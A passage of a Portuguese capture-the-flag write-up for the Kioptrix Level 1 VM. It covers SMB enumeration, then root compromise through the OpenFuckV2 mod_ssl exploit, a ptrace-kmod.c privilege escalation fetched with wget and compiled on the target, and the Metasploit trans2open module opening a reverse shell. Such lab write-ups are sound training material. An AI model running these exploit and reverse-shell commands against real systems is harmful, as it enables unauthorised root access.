MAC Address: 08:00:27:80:D8:F4 (Oracle VirtualBox virtual NIC)

Nmap done: 1 IP address (1 host up) scanned in 21.42 seconds
```

Evidências em capturas de tela:

- ![Página de teste (`/test.php`)](images/page-test.php.png)
- ![Ícones não encontrados (`/icons`)](images/page-icons.png)
- ![Página manual (`/manual`)](images/page-manual.png)

### Enumeração SMB
Resultados da enumeração anônima:

```bash
$ Metasploit auxiliary/scanner/smb/smb_version (RHOSTS 192.168.56.106, RPORT 139)
msf > search smb_version
...
msf > use auxiliary/scanner/smb/smb_version
msf auxiliary(scanner/smb/smb_version) > set rhosts 192.168.56.106
rhosts => 192.168.56.106
msf auxiliary(scanner/smb/smb_version) > set rport 139
rport => 139
msf auxiliary(scanner/smb/smb_version) > run
...
[*] 192.168.56.106:139 - SMB Detected (versions: ) (preferred dialect: ) (signatures: optional)
[+] 192.168.56.106:139 - Host is running Unix
[*] 192.168.56.106:139 - SMB signing is not required
[*] 192.168.56.106 - Scanned 1 of 1 hosts (100% complete)
[*] Auxiliary module execution completed

$ enum4linux -a 192.168.56.106
Starting enum4linux v0.9.1 ( http://labs.portcullis.co.uk/application/enum4linux/ ) on Mon Nov 23 16:45:35 2026

 =========================================( Target Information )=========================================
Target ........... 192.168.56.106
RID Range ........ 500-550,1000-1050
Username ......... ''
Password ......... ''
Known Usernames .. administrator, guest, krbtgt, domain admins, root, bin, none

 ===========================( Enumerating Workgroup/Domain on 192.168.56.106 )===========================
[+] Got domain/workgroup name: MYGROUP

 ===============================( Nbtstat Information for 192.168.56.106 )===============================
...
        KIOPTRIX        <00> -         B <ACTIVE>  Workstation Service
        KIOPTRIX        <20> -         B <ACTIVE>  File Server Service
        ..__MSBROWSE__. <01> - <GROUP> B <ACTIVE>  Master Browser
        MYGROUP         <00> - <GROUP> B <ACTIVE>  Domain/Workgroup Name

 ==================================( Session Check on 192.168.56.106 )==================================
[+] Server 192.168.56.106 allows sessions using username '', password ''

 =======================================( Getting domain SID ... )=======================================
...
 ==================================( OS information on 192.168.56.106 )==================================
[+] Got OS info for 192.168.56.106 from srvinfo:
        KIOPTRIX       Wk Sv PrQ Unx NT SNT Samba Server
        platform_id     :       500
        os version      :       4.5
        server type     :       0x9a03

 ======================================( Users on 192.168.56.106 )======================================

 ================================( Share Enumeration on 192.168.56.106 )================================
        Sharename       Type      Comment
        ---------       ----      -------
        IPC$            IPC       IPC Service (Samba Server)
        ADMIN$          IPC       IPC Service (Samba Server)
...
//192.168.56.106/IPC$   Mapping: N/A Listing: N/A Writing: N/A
...
//192.168.56.106/ADMIN$ Mapping: N/A Listing: N/A Writing: N/A

 ===========================( Password Policy Information ... )========================================
[+] Retieved partial password policy with rpcclient:
Password Complexity: Disabled
Minimum Password Length: 0

 =======================================( Groups on 192.168.56.106 )======================================
...
group:[Administrators] rid:[0x220]
...
[+]  Getting local groups:
group:[sys] rid:[0x3ef]
...

 =================( Users on 192.168.56.106 via RID cycling (RIDS: 500-550,1000-1050) )=================
...
S-1-5-21-4157223341-3243572438-1405127623-1000 KIOPTRIX\root (Local User)
...
S-1-5-21-4157223341-3243572438-1405127623-1050 KIOPTRIX\unix_user.25 (Local User)

 ==============================( Getting printer info for 192.168.56.106 )==============================
No printers returned.

enum4linux complete on Mon Nov 23 16:45:42 2026

$ smbclient -L //192.168.56.106/ -N
Anonymous login successful

        Sharename       Type      Comment
        ---------       ----      -------
        IPC$            IPC       IPC Service (Samba Server)
        ADMIN$          IPC       IPC Service (Samba Server)
Reconnecting with SMB1 for workgroup listing.
Anonymous login successful

        Server               Comment
        ---------            -------
        KIOPTRIX             Samba Server

        Workgroup            Master
        ---------            -------
        MYGROUP              KIOPTRIX

$ smbclient //192.168.56.106/IPC$ -N
Server does not support EXTENDED_SECURITY  but 'client use spnego = yes' and 'client ntlmv2 auth = yes' is set
Anonymous login successful
Try "help" to get a list of possible commands.
smb: \> help
...
smb: \>

$ smbclient //192.168.56.106/ADMIN$ -N
Server does not support EXTENDED_SECURITY  but 'client use spnego = yes' and 'client ntlmv2 auth = yes' is set
Anonymous login successful
tree connect failed: NT_STATUS_WRONG_PASSWORD
```

### Fluxo de Exploração
1. **Apache mod_ssl - CVE-2002-0082 (execução remota de código + escalada de privilégios).** O `searchsploit` localizou o exploit OpenFuckV2; ele foi compilado e executado com o offset do Red Hat 7.2 / Apache 1.3.20 (`0x6b`) contra a porta 443, resultando em um shell como `apache`. Em seguida, o exploit de kernel `ptrace-kmod.c` foi baixado do host Kali, compilado e executado para obter `root`. Referência: https://medium.com/@mahmoudelshorpagy7/kioptrix-l-writeup-apache-mod-ssl-exploitation-openfuckv2-ce5efcb893dd

   A execução do exploit com `-c 40` e o servidor HTTP que disponibiliza `ptrace-kmod.c` precisam ser iniciados em **terminais separados no Kali**. Os comandos após `Spawning shell...` rodam dentro do shell alvo obtido pelo exploit.

   Trechos relevantes:

   ```bash
   $ searchsploit apache mod_ssl
   ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
    Exploit Title                                                                                                                                                                                            |  Path
   ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
   Apache mod_ssl 2.0.x - Remote Denial of Service                                                                                                                                                           | linux/dos/24590.txt
   Apache mod_ssl 2.8.x - Off-by-One HTAccess Buffer Overflow                                                                                                                                                | multiple/dos/21575.txt
   Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuck.c' Remote Buffer Overflow                                                                                                                                      | unix/remote/21671.c
   Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (1)                                                                                                                                | unix/remote/764.c
   Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (2)                                                                                                                                | unix/remote/47080.c
   Apache mod_ssl OpenSSL < 0.9.6d / < 0.9.7-beta2 - 'openssl-too-open.c' SSL2 KEY_ARG Overflow                                                                                                              | unix/remote/40347.txt
   ---------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------------- ---------------------------------
   Shellcodes: No Results

   $ searchsploit -m 47080.c
   Exploit: Apache mod_ssl < 2.8.7 OpenSSL - 'OpenFuckV2.c' Remote Buffer Overflow (2)
       URL: https://www.exploit-db.com/exploits/47080
       Path: /usr/share/exploitdb/exploits/unix/remote/47080.c
   Codes: CVE-2002-0082, OSVDB-857
   Verified: False
   File Type: C source, ASCII text
   Copied to: /home/kali/Documents/kioptrix/47080.c

   $ gcc 47080.c -o OpenFuck -lcrypto -lssl
   47080.c: In function ‘read_ssl_packet’:
   47080.c:534:17: warning: ‘RC4’ is deprecated: Since OpenSSL 3.0 [-Wdeprecated-declarations]
   ...
   47080.c: In function ‘send_client_master_key’:
   ...
   47080.c: In function ‘generate_key_material’:
   ...
   47080.c: In function ‘generate_session_keys’:
   ...

   $ ./OpenFuck
   *********************************************************************
   * OpenFuck v3.0.4-root priv8 by SPABAM based on openssl-too-open *
   *********************************************************************
   ...
   : Usage: ./openfuck target box [port] [-c N]

     target - supported box eg: 0x00
     box - hostname or IP address
     port - port for ssl connection
     -c open N connections. (use range 40-50 if u dont know)

     Supported OffSet:
           0x00 - Caldera OpenLinux (apache-1.3.26)
   ...
           0x6a - RedHat Linux 7.2 (apache-1.3.20-16)1
           0x6b - RedHat Linux 7.2 (apache-1.3.20-16)2
   ...
           0x8a - Yellow Dog Linux/PPC 2.3 (apache-1.3.22-6.2.3a)

   $ ./OpenFuck 0x6b 192.168.56.106 443
   *********************************************************************
   * OpenFuck v3.0.4-root priv8 by SPABAM based on openssl-too-open *
   ...
   Establishing SSL connection
   cipher: 0x4043808c   ciphers: 0x80f8050
   Ready to send shellcode
   Spawning shell...
   bash: no job control in this shell
   bash-2.05$
   d.c; ./exploit; -kmod.c; gcc -o exploit ptrace-kmod.c -B /usr/bin; rm ptrace-kmo
   --20:17:26--  https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
              => `ptrace-kmod.c'
   Connecting to dl.packetstormsecurity.net:443...
   dl.packetstormsecurity.net: Host not found.
   gcc: ptrace-kmod.c: No such file or directory
   gcc: No input files
   rm: cannot remove `ptrace-kmod.c': No such file or directory
   bash: ./exploit: No such file or directory
   bash-2.05$ pwd
   pwd
   /tmp
   bash-2.05$ id
   id
   uid=48(apache) gid=48(apache) groups=48(apache)
   bash-2.05$ whoami
   whoami
   apache
   bash-2.05$

   # Terminal 1 (Kali) - baixe o código e mantenha este servidor rodando
   $ wget https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
   --2026-11-24 17:20:57--  https://dl.packetstormsecurity.net/0304-exploits/ptrace-kmod.c
   Resolving dl.packetstormsecurity.net (dl.packetstormsecurity.net)... 64.71.185.201
   Connecting to dl.packetstormsecurity.net|64.71.185.201|:443... connected.
   HTTP request sent, awaiting response... 200 OK
   Length: 3921 (3.8K) [text/x-csrc]
   Saving to: ‘ptrace-kmod.c’

   ptrace-kmod.c                                              100%[========================================================================>]   3.83K  --.-KB/s    in 0s

   2026-11-24 17:20:58 (141 MB/s) - ‘ptrace-kmod.c’ saved [3921/3921]

   $ python3 -m http.server 8080
   Serving HTTP on 0.0.0.0 port 8080 (http://0.0.0.0:8080/) ...
   192.168.56.106 - - [24/Nov/2026 17:24:54] "GET /ptrace-kmod.c HTTP/1.0" 200 -
   ```

   Terminal 2 (Kali) - execute o exploit em outro terminal enquanto o Terminal 1 continua servindo o arquivo:

   ```bash
   $ ./OpenFuck 0x6b 192.168.56.106 443 -c 40
   ...
   Connection... 40 of 40
   Establishing SSL connection
   ...
   Spawning shell...
   bash: no job control in this shell
   bash-2.05$
   ```

   Shell no alvo (dentro da sessão do Terminal 2):

   ```bash
   bash-2.05$ wget http://192.168.56.102:8080/ptrace-kmod.c
   ...
   20:24:53 (3.74 MB/s) - `ptrace-kmod.c' saved [3921/3921]
   bash-2.05$ ls -la
   ...
   -rw-r--r--    1 apache   apache       3921 Apr  1  2003 ptrace-kmod.c
   bash-2.05$ gcc ptrace-kmod.c -o privesc
   bash-2.05$ ./privesc
   [+] Attached to 1110
   [+] Waiting for signal
   [+] Signal caught
   [+] Shellcode placed at 0x4001189d
   [+] Now wait for suid shell...
   whoami
   root
   id
   uid=0(root) gid=0(root) groups=0(root),1(bin),2(daemon),3(sys),4(adm),6(disk),10(wheel)
   ...
   ```

2. **Samba Trans2Open - CVE-2003-0201 (overflow de buffer).** O módulo `exploit/linux/samba/trans2open` do Metasploit foi configurado com `RHOSTS 192.168.56.106`, `RPORT 139`, payload `generic/shell_reverse_tcp` e `LHOST 192.168.56.102`; ele retornou um shell como `root`. Referência: https://github.com/ruslaniha/Kioptrix-CTF-Project

   Todos os comandos abaixo rodam em um único terminal `msfconsole`; o próprio Metasploit inicia o handler reverso, então não é necessário um segundo terminal.

   Trechos relevantes:

   ```bash
   $ msfconsole
   msf > search trans2open

   Matching Modules
   ================

      #  Full Name                                                    Disclosure Date  Rank   Check  Name
      -  ---------                                                    ---------------  ----   -----  ----
      0  exploit/freebsd/samba/trans2open                             2003-04-07       great  No     Samba trans2open Overflow (*BSD x86)
      1  exploit/linux/samba/trans2open                               2003-04-07       great  No     Samba trans2open Overflow (Linux x86)
      2  exploit/osx/samba/trans2open                                 2003-04-07       great  No     Samba trans2open Overflow (Mac OS X PPC)
      3  exploit/solaris/samba/trans2open                             2003-04-07       great  No     Samba trans2open Overflow (Solaris SPARC)
      4    \_ target: Samba 2.2.x - Solaris 9 (sun4u) - Bruteforce    .                .      .      .
      5    \_ target: Samba 2.2.x - Solaris 7/8 (sun4u) - Bruteforce  .                .      .      .

   msf > use exploit/linux/samba/trans2open
   [*] No payload configured, defaulting to linux/x86/meterpreter/reverse_tcp
   msf exploit(linux/samba/trans2open) > show options
   ...
   Module options (exploit/linux/samba/trans2open):
      Name    Current Setting  Required  Description
      ----    ---------------  --------  -----------
      RHOSTS                   yes       The target host(s), see https://docs.metasploit.com/docs/using-metasploit/basics/using-metasploit.html
      RPORT   139              yes       The target port (TCP)

   Payload options (linux/x86/meterpreter/reverse_tcp):
      Name   Current Setting  Required  Description
      ----   ---------------  --------  -----------
      LHOST  10.0.3.15        yes       The listen address (an interface may be specified)
      LPORT  4444             yes       The listen port

   Exploit target:
      Id  Name
      --  ----
      0   Samba 2.2.x - Bruteforce

   msf exploit(linux/samba/trans2open) > set PAYLOAD generic/shell_reverse_tcp
   PAYLOAD => generic/shell_reverse_tcp
   msf exploit(linux/samba/trans2open) > set RHOSTS 192.168.56.106
   RHOSTS => 192.168.56.106
   msf exploit(linux/samba/trans2open) > set LHOSTS 192.168.56.102
   [!] Unknown datastore option: LHOSTS. Did you mean LHOST?
   LHOSTS => 192.168.56.102
   msf exploit(linux/samba/trans2open) > set LHOST 192.168.56.102
   LHOST => 192.168.56.102
   msf exploit(linux/samba/trans2open) > exploit

   [*] Started reverse TCP handler on 192.168.56.102:4444
   [*] 192.168.56.106:139 - Trying return address 0xbffffdfc...
   ...
   [*] 192.168.56.106:139 - Trying return address 0xbffff6fc...
   [*] Command shell session 1 opened (192.168.56.102:4444 -> 192.168.56.106:32770) at 2026-11-24 18:32:06 -0300
   [*] Command shell session 2 opened (192.168.56.102:4444 -> 192.168.56.106:32771) at 2026-11-24 18:32:07 -0300
   ...
   id
   uid=0(root) gid=0(root) groups=99(nobody)
   whoami
   root
   pwd
   /tmp
   cd /root
   ls -la
   ...
   drwxr-x---    2 root     root         4096 Sep 26  2009 .
   ...
   -rw-r--r--    1 root     root         1303 Sep 26  2009 anaconda-ks.cfg
   ```

### Reproduzindo o Passo a Passo
- **Descubra o alvo** com `netdiscover` na rede host-only e identifique o host Kioptrix.
- **Faça o fingerprint do host** com `nmap -sC -sV -p-` e `nmap -O`; registre portas, versões e sistema operacional.
- **Enumere caminhos web** nas portas 80/443 com `gobuster` e o script `http-enum`; capture as imagens armazenadas em `images/`.
- **Enumere o SMB** com o módulo de versão SMB do Metasploit, `enum4linux` e `smbclient`; observe o acesso anônimo a `IPC$` e a falha em `ADMIN$`.
- **Explore o Apache mod_ssl** e depois escale de `apache` para `root` com `ptrace-kmod.c`.
- **Explore o Samba Trans2Open** na porta 139 para obter uma shell reversa como root.
- **Documente** cada etapa e mantenha as capturas em `images/`.

### Referências
- CVE-2002-0082 (Apache mod_ssl): https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2002-0082
- CVE-2003-0201 (Samba Trans2Open): https://cve.mitre.org/cgi-bin/cvename.cgi?name=CVE-2003-0201
- Write-up Kioptrix L (Medium): https://medium.com/@mahmoudelshorpagy7/kioptrix-l-writeup-apache-mod-ssl-exploitation-openfuckv2-ce5efcb893dd
- Projeto Kioptrix CTF (GitHub): https://github.com/ruslaniha/Kioptrix-CTF-Project
